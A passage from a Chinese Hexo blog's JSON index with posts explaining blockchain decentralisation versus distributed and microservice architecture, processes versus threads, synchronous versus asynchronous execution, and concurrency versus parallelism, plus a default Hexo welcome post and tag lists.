简单的来说，去中心化，就是不要中心，人人都可能成为中心的意思。（例如：Facebook，博客这类） 2.然后，为什么需要区块链这个东西呢？咱们以支付包转账举例： 这里，假设用户A购买了用户B的商品，支付宝便是第三方负责这个交易的。但，假设我们使用跑代码的方法进行入账和出账（这里补充一点，支付宝一开始人工处理这些交易的），怎么才能保证绝对的安全呢？很明显这点很难做到 这便是传统的中心化（所有的用户都以支付宝为中心）： 3.去中心化服务的区块链为了解决人工，安全等问题，支付宝便使用了区块链网络 用户各自为节点，各自为中心，每一个人都拥有各自的一个密钥，每个人都拥有着同一个账本，而不是由支付宝一个人账了。 这里可能又有人要问了，如果我修改了自己的拥有的那一份账本上自己的数据（假设你给自己账户+2 000 000），会造成什么影响呢？ 假设你修改了，但是其它51%的人的账户都还是显示的你是原来账户上的数据所以并不会改变（这也是传说中的比特币为什么那么难以攻破它市值的原因） （如果大家看过“硅谷“这个电视剧，有一个片段就是将的一个攻防战，讲的就是一个去中心化的服务，谁先占有51%的用户，就拥有网络的操作权） 分步式服务略微了解了区块链后，现在我们来了解下分布式服务框架（因为这两个对于刚开始了解的人很容易搞混） 概念：当计算机的程序和数据通过网络分布在多于一个的计算机上时，计算就成为“分布式的” 简单来说，就是一个硬件或软件组件分布在不同的网络计算机上，彼此之间仅仅通过消息传递进行通信和协调的系统，常见的消息传递就是通过HTTP的RESTful API进行传输 1.为什么要有分布式服务?首先，假设我们有个抢票系统的服务，并且这个使用的是单架构模式 若一个用户购票后，我们需要对数据库进行进行用户信息的处理和影票信息的处理 这里需要先了解：一个tomcat通常能够承载200~300并发（取决于硬件及网络等外界条件），一个mysql默认并发数100 所以，如果有大量用户同时购买，对数据库的压力就会很大，若其中用户信息溢出或影票信息的临时更新，都会导致整个服务不可用。 2.什么是分布式架构模式 概念：整个系统的功能单位分散到不同的进程,**然后够个进程共同提供不同的业务能力**,我们称之为”分布式架构”(Distributed Architecture) 光看概念肯定是难以理解，下面还是借用上面那个例子来举例 很明显两个数据库各储存各的，即是一个宕机了，也不会影响另一个。虽然我们看似分开处理比合并着处理好多了。但这也是有缺点的，一是数据库多了。维护成本自然大了，二则是对资源的要求也增加了。 3.微服务架构模式这里只做点了解，why？（因为我也不是很会） 首先先来了解什么是微服务 简单来说微服务就是很小的服务，小到一个服务只对应一个单一的功能，只做一件事。这个服务可以单独部署运行，服务之间可以通过RPC来相互交互，每个微服务都是由独立的小团队开发，测试，部署，上线，负责它的整个生命周期 那微服务架构又是啥？ 在做架构设计的时候，先做逻辑架构，再做物理架构，当你拿到需求后，估算过最大用户量和并发量后，计算单个应用服务器能否满足需求，如果用户量只有几百人的小应用，单体应用就能搞定，即所有应用部署在一个应用服务器里，如果是很大用户量，且某些功能会被频繁访问，或者某些功能计算量很大，建议将应用拆解为多个子系统，各自负责各自功能，这就是微服务架构。 分布式和微服务的区别： ​ 1.生产环境下的微服务肯定是分布式部署的，分布式部署的应用不一定是微服务架构的，比如集群部署，它是把相同应用复制到不同服务器上，但是逻辑功能上还是单体应用。 ​ 2.微服务架构模式很像分布式，但它的粒度更小，服务之间耦合度更低，由于每个微服务都由独立的小团队负责，因此它敏捷性更高，但维护起来也更麻烦 4.总结 单体架构 分布式架构 优点 1.易于开发 2.易于部署 3.易于扩展（后续可扩展多个副本） 1.吞吐量大 2.单个服务维护成本低 3.可靠性强（即是单个服务宕机了，其它服务也能正常运行） 缺点 1.可靠性差 2.维护成本高 3.吞吐量小 1.对技术要求高 2.人力成本大 3.资源要求大 总的来说区块链与分布式的联系并不是很大，但区块链使用了分布式架构的想法，实现去中心化，把每个用户都当作一个体，各自可为中心，而分布式则是面向的服务，把服务细分，各管各的。（更多关于区块链的可以去了解传说中的比特币） 参考链接：https://blog.csdn.net/weixin_45393094/article/details/104632343 https://zhuanlan.zhihu.com/p/22228902 https://blog.csdn.net/zhonglunsheng/article/details/83153451","categories":[{"name":"随笔","slug":"随笔","permalink":"https://github.com/z-anshun/categories/%E9%9A%8F%E7%AC%94/"}],"tags":[{"name":"架构","slug":"架构","permalink":"https://github.com/z-anshun/tags/%E6%9E%B6%E6%9E%84/"}]},{"title":"浅谈进程与协程、异步与同步、并发与并行","slug":"infomal","date":"2020-10-14T13:35:35.000Z","updated":"2020-10-14T13:54:38.688Z","comments":true,"path":"2020/10/14/infomal/","link":"","permalink":"https://github.com/z-anshun/2020/10/14/infomal/","excerpt":"","text":"今天偶然看到异步和同步的文章，联想到了进程，线程这些。下面，我来浅谈一下进程、线程、异步和同步 进程和线程进程 一个程序的执行过程，是一个Windows系统中的一个动态的概念，包含了一个线程或多个线程。 每一个进程的都有自己的空间地址，内存不共享 一个进程至少有5种基本状态，分别是：初始态，执行态，等待状态，就绪状态，终止状态。 线程 CPU调度的和分配的基本单位 它可与同属的一个进程的多个线程共享资源 这里补充一点，协程(gorutine)是依赖于线程来管理的，就对GO语言而说，因为我们能直接管理线程，便通过协程来调度，实现其百万并发 进程和线程的区别 进程 线程 基本单元 资源分配的基本单元 cpu调度的基本单元 关于资源 不能共享 同一进程的线程可共享 创建与切换的开销 大 小 同步(Sync)和异步(Async)同步概念：在执行一个事件的时候，没有得到返回结果前，就不会继续往下执行 换句话来说：就是按顺序一件一件事情的做，只能等前一件事情做完了才能往下继续 举个例子 有个人头铁，提交了作业后，非要等评分出了，才去干其它事情 异步概念：与同步相对，在执行一个事件的时候，即是没有得到返回结果，也可以继续往下执行。但这里要注意的是当调用完成后，一般是通过状态、通知和回调来通知调用者的，并且调用的返回不再受调用者控制（这里可以联系到js的回调函数，具体我就不说） 举个​例子:后来，这个人变聪明，提交作业后，就不管了，去干其它事情了 同步和异步的区别总的来说，同步和异步的区别就是在于是否需要等待结果的返回 并发和并行并发 概念：在操作系统中，是指一个时间段中有几个程序都处于已启动运行到运行完毕之间，且这几个程序都是在同一个处理机上运行，但任一个时刻点上只有一个程序在处理机上运行。 这里需要补充的是，当多个线程在一个cpu上运行的时候，实际上也不是同时运行的，cpu只是将时间划分成多个时间段，然后分配给各个线程。当一个线程在运行的时候，其它线程处于阻塞状态 还是举个例子：当你在吃饭的时候，电话打来了，你就去接电话了，接完了回来再继续吃饭 并行 概念：当系统有一个以上CPU时，则线程的操作有可能非并发。当一个CPU执行一个线程时，另一个CPU可以执行另一个线程，两个线程互不抢占CPU资源，可以同时进行，这种方式我们称之为并行(Parallel) 简而言之，就是同时进行，举个例子：你在吃饭，电话来了，然后你边吃饭边接电话 并发与并行的总结并发主要的是 排队、等待、执行。 并行则时同时执行。 参考连接： https://www.cnblogs.com/mhq-martin/p/9035640.html https://www.cnblogs.com/linguanh/p/11629828.html","categories":[{"name":"随笔","slug":"随笔","permalink":"https://github.com/z-anshun/categories/%E9%9A%8F%E7%AC%94/"}],"tags":[{"name":"基础","slug":"基础","permalink":"https://github.com/z-anshun/tags/%E5%9F%BA%E7%A1%80/"}]},{"title":"Hello World","slug":"hello-world","date":"2020-10-04T05:43:12.009Z","updated":"2020-10-04T05:43:12.009Z","comments":true,"path":"2020/10/04/hello-world/","link":"","permalink":"https://github.com/z-anshun/2020/10/04/hello-world/","excerpt":"","text":"Welcome to Hexo! This is your very first post. Check documentation for more info. If you get any problems when using Hexo, you can find the answer in troubleshooting or you can ask me on GitHub. Quick StartCreate a new post1$ hexo new \"My New Post\" More info: Writing Run server1$ hexo server More info: Server Generate static files1$ hexo generate More info: Generating Deploy to remote sites1$ hexo deploy More info: Deployment","categories":[],"tags":[]}],"categories":[{"name":"学校","slug":"学校","permalink":"https://github.com/z-anshun/categories/%E5%AD%A6%E6%A0%A1/"},{"name":"redis","slug":"redis","permalink":"https://github.com/z-anshun/categories/redis/"},{"name":"手搓docker","slug":"手搓docker","permalink":"https://github.com/z-anshun/categories/%E6%89%8B%E6%90%93docker/"},{"name":"Linux","slug":"Linux","permalink":"https://github.com/z-anshun/categories/Linux/"},{"name":"安全","slug":"安全","permalink":"https://github.com/z-anshun/categories/%E5%AE%89%E5%85%A8/"},{"name":"算法","slug":"算法","permalink":"https://github.com/z-anshun/categories/%E7%AE%97%E6%B3%95/"},{"name":"面经","slug":"面经","permalink":"https://github.com/z-anshun/categories/%E9%9D%A2%E7%BB%8F/"},{"name":"学习","slug":"学习","permalink":"https://github.com/z-anshun/categories/%E5%AD%A6%E4%B9%A0/"},{"name":"作业","slug":"作业","permalink":"https://github.com/z-anshun/categories/%E4%BD%9C%E4%B8%9A/"},{"name":"技术交流","slug":"技术交流","permalink":"https://github.com/z-anshun/categories/%E6%8A%80%E6%9C%AF%E4%BA%A4%E6%B5%81/"},{"name":"随笔","slug":"随笔","permalink":"https://github.com/z-anshun/categories/%E9%9A%8F%E7%AC%94/"}],"tags":[{"name":"大数据","slug":"大数据","permalink":"https://github.com/z-anshun/tags/%E5%A4%A7%E6%95%B0%E6%8D%AE/"},{"name":"books","slug":"books","permalink":"https://github.com/z-anshun/tags/books/"},{"name":"redis设计与实现","slug":"redis设计与实现","permalink":"https://github.com/z-anshun/tags/redis%E8%AE%BE%E8%AE%A1%E4%B8%8E%E5%AE%9E%E7%8E%B0/"},{"name":"docker","slug":"docker","permalink":"https://github.com/z-anshun/tags/docker/"},{"name":"每日命令","slug":"每日命令","permalink":"https://github.com/z-anshun/tags/%E6%AF%8F%E6%97%A5%E5%91%BD%E4%BB%A4/"},{"name":"SQL注入","slug":"SQL注入","permalink":"https://github.com/z-anshun/tags/SQL%E6%B3%A8%E5%85%A5/"},{"name":"算法","slug":"算法","permalink":"https://github.com/z-anshun/tags/%E7%AE%97%E6%B3%95/"},{"name":"计网","slug":"计网","permalink":"https://github.com/z-anshun/tags/%E8%AE%A1%E7%BD%91/"},{"name":"二叉树","slug":"二叉树","permalink":"https://github.com/z-anshun/tags/%E4%BA%8C%E5%8F%89%E6%A0%91/"},{"name":"滑动窗口","slug":"滑动窗口","permalink":"https://github.com/z-anshun/tags/%E6%BB%91%E5%8A%A8%E7%AA%97%E5%8F%A3/"},{"name":"Redis","slug":"Redis","permalink":"https://github.com/z-anshun/tags/Redis/"},{"name":"BFS","slug":"BFS","permalink":"https://github.com/z-anshun/tags/BFS/"},{"name":"动归","slug":"动归","permalink":"https://github.com/z-anshun/tags/%E5%8A%A8%E5%BD%92/"},{"name":"https","slug":"https","permalink":"https://github.com/z-anshun/tags/https/"},{"name":"动态窗口","slug":"动态窗口","permalink":"https://github.com/z-anshun/tags/%E5%8A%A8%E6%80%81%E7%AA%97%E5%8F%A3/"},{"name":"Golang","slug":"Golang","permalink":"https://github.com/z-anshun/tags/Golang/"},{"name":"树状数组","slug":"树状数组","permalink":"https://github.com/z-anshun/tags/%E6%A0%91%E7%8A%B6%E6%95%B0%E7%BB%84/"},{"name":"JAVA","slug":"JAVA","permalink":"https://github.com/z-anshun/tags/JAVA/"},{"name":"数据结构","slug":"数据结构","permalink":"https://github.com/z-anshun/tags/%E6%95%B0%E6%8D%AE%E7%BB%93%E6%9E%84/"},{"name":"web攻击","slug":"web攻击","permalink":"https://github.com/z-anshun/tags/web%E6%94%BB%E5%87%BB/"},{"name":"架构","slug":"架构","permalink":"https://github.com/z-anshun/tags/%E6%9E%B6%E6%9E%84/"},{"name":"基础","slug":"基础","permalink":"https://github.com/z-anshun/tags/%E5%9F%BA%E7%A1%80/"}]}